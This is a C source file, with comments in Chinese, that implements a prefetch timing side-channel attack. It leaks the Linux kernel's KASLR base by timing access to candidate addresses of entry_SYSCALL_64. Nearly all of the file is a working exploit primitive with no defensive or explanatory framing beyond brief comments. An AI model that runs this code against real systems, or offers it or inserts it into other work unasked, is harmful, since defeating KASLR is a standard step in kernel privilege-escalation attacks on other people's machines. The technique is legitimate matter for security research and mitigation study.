#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>

// kernel text mapping + kaslr 
#define KERNEL_LOWER_BOUND 0xffffffff80000000ull
#define KERNEL_UPPER_BOUND 0xffffffffc0000000ull

// 固定偏移
#define entry_SYSCALL_64_offset 0x400000ull

// 测信道，计算取地址时间
uint64_t sidechannel(uint64_t addr) {
  uint64_t a, b, c, d;
  asm volatile(
      ".intel_syntax noprefix;"
      "mfence;"
      "rdtscp;"
      "mov %0, rax;"
      "mov %1, rdx;"
      "xor rax, rax;"
      "lfence;"
      "prefetchnta qword ptr [%4];"
      "prefetcht2 qword ptr [%4];"
      "xor rax, rax;"
      "lfence;"
      "rdtscp;"
      "mov %2, rax;"
      "mov %3, rdx;"
      "mfence;"
      ".att_syntax;"
      : "=r"(a), "=r"(b), "=r"(c), "=r"(d)
      : "r"(addr)
      : "rax", "rbx", "rcx", "rdx");
  a = (b << 32) | a;
  c = (d << 32) | c;
  return c - a;
}

// kaslr 的偏移一定是 0x100000 的倍数
#define STEP 0x100000ull

// 可能的范围
#define SCAN_START KERNEL_LOWER_BOUND + entry_SYSCALL_64_offset
#define SCAN_END KERNEL_UPPER_BOUND + entry_SYSCALL_64_offset

#define DUMMY_ITERATIONS 5
#define ITERATIONS 100
#define ARR_SIZE (SCAN_END - SCAN_START) / STEP

// 泄露 syscall_entry 的地址
uint64_t leak_syscall_entry(void) {
  uint64_t data[ARR_SIZE] = {0};
  uint64_t min = ~0, addr = ~0;
  
  // 循环测试地址
  for (int i = 0; i < ITERATIONS + DUMMY_ITERATIONS; i++) {
    // 缓解cache缓存的影响，如果一直访问一个地址，误差就会很大
    for (uint64_t idx = 0; idx < ARR_SIZE; idx++) {
      uint64_t test = SCAN_START + idx * STEP;
      syscall(104);
      uint64_t time = sidechannel(test);
      if (i >= DUMMY_ITERATIONS) data[idx] += time;
    }
  }

  for (int i = 0; i < ARR_SIZE; i++) {
    data[i] /= ITERATIONS;
    if (data[i] < min) {
      min = data[i];
      addr = SCAN_START + i * STEP;
    }
    printf("%llx %ld\n", (SCAN_START + i * STEP), data[i]);
  }

  return addr;
}

int main() {
  // 开启kaslr后的 kernel base
  printf("KASLR base 0x%llx\n", leak_syscall_entry() - entry_SYSCALL_64_offset);
}